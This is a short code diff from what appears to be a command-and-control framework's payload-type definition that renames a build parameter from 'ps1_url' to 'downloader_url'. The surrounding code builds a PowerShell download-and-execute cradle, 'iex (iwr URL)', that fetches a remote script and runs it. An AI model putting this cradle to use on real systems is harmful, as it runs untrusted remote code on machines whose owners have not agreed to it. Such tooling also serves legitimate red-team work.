@@ -24,7 +24,7 @@ class psh_remote_psh(PayloadType):
     agent_code_path = agent_path / "agent_code"
     build_parameters = [
         BuildParameter(
-            name = "ps1_url",
+            name = "downloader_url",
             parameter_type=BuildParameterType.String,
             description="Powershell script to be downloaded and executed",
         ),
@@ -40,7 +40,7 @@ class psh_remote_psh(PayloadType):
         build_msg = ""
 
         try:
-            url = self.get_parameter("ps1_url")
+            url = self.get_parameter("downloader_url")
             
             payload = """iex (iwr '%s')""" % url
 
